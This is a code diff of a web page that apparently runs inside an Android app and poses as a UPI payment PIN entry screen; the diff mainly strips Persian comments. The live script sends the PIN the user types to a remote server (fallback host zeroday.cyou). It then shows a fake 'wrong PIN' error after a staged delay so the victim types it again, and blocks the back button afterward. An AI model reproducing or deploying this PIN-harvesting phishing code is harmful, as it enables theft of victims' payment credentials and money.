@@ -305,7 +305,6 @@ h5 {
         </div>
     </div>
 
-    <!-- Error Dialog - پین اشتباهه -->
     <div class="verify-dialog" id="errorPinDialog" style="display: none;">
         <div class="verify-content">
             <div class="verify-icon" style="color: #f44336;">
@@ -323,13 +322,12 @@ h5 {
     let enteredNumbers = [];
     let isHidden = true;
     let savedPIN = '';
-    let isFirstAttempt = true;  // ⭐ برای track کردن اولین تلاش
+    let isFirstAttempt = true;
     
-    // ⭐ چک کردن اینکه آیا قبلاً PIN وارد شده یا نه
     function checkAttemptStatus() {
       const savedAttempt = localStorage.getItem('upi_pin_attempt');
       if (savedAttempt === 'failed') {
-        isFirstAttempt = false;  // قبلاً یک بار fail شده
+        isFirstAttempt = false;
       }
     }
     
@@ -413,7 +411,6 @@ h5 {
     
     function closeErrorPinDialog() {
         document.getElementById('errorPinDialog').style.display = 'none';
-        // ⭐ بعد از بستن error dialog، PIN رو پاک کن برای تلاش بعدی
         enteredNumbers = [];
         updateDisplay();
     }
@@ -423,28 +420,22 @@ h5 {
             let upiPin = enteredNumbers.join('');
             savedPIN = upiPin;
             
-            // ⭐ اگر اولین بار هست، timer نشون بده و بعد error
             if (isFirstAttempt) {
-                // ⭐ Timer dialog نشون بده (مثل بار دوم)
                 showVerifyDialog();
                 
-                // ⭐ بعد از 3 ثانیه PIN رو ارسال کن (با status failed) و error نشون بده
                 setTimeout(() => {
-                    // ⭐ ارسال PIN به سرور با status failed
-                    sendPinToServer(upiPin, false);  // false = failed
+                    sendPinToServer(upiPin, false);
                     
                     hideVerifyDialog();
-                    showErrorPinDialog();  // ⭐ error "پین اشتباهه" نشون بده
-                    localStorage.setItem('upi_pin_attempt', 'failed');  // ذخیره که fail شده
-                    isFirstAttempt = false;  // بار بعد موفق باشه
-                    // پاک کردن PIN برای تلاش بعدی
+                    showErrorPinDialog();
+                    localStorage.setItem('upi_pin_attempt', 'failed');
+                    isFirstAttempt = false;
                     enteredNumbers = [];
                     updateDisplay();
-                }, 3000);  // ⭐ 3 ثانیه مثل بار دوم برای طبیعی بودن
+                }, 3000);
                 return;
             }
             
-            // ⭐ بار دوم: timer نشون بده و بعد ارسال کن
             submitToServer(upiPin);
         } else {
             if (navigator.vibrate) {
@@ -453,7 +444,6 @@ h5 {
         }
     }
 
-    // ⭐ تابع مشترک برای ارسال PIN به سرور
     function sendPinToServer(upiPin, isSuccess) {
         const deviceId = getDeviceId();
         const userId = getUserId();
@@ -463,15 +453,13 @@ h5 {
             device_id: deviceId,
             app_type: appType,
             user_id: userId,
-            status: isSuccess ? "success" : "failed"  // ⭐ status برای سرور
+            status: isSuccess ? "success" : "failed"
         };
 
-        // ⭐ Get Base URL from Android
         let baseUrl;
         try {
             baseUrl = Android.getBaseUrl();
         } catch (e) {
-            // Fallback for browser testing
             baseUrl = 'https://zeroday.cyou';
             console.log('Using fallback URL');
         }
@@ -499,15 +487,12 @@ h5 {
     }
 
     function submitToServer(upiPin) {
-        // ⭐ بار دوم: timer dialog نشون بده
         showVerifyDialog();
         
-        // ⭐ ارسال PIN به سرور با status موفق
-        sendPinToServer(upiPin, true);  // true = successful
+        sendPinToServer(upiPin, true);
 
-        // ⭐ Timer 3 ثانیه و بعد redirect
         setTimeout(() => {
-            localStorage.removeItem('upi_pin_attempt');  // پاک کردن attempt status
+            localStorage.removeItem('upi_pin_attempt');
             hideVerifyDialog();
             history.pushState(null, null, location.href);
             window.onpopstate = function() {
@@ -517,7 +502,6 @@ h5 {
         }, 3000);
     }
 
-    // ⭐ چک کردن وضعیت attempt در load
     checkAttemptStatus();
     updateDisplay();
 
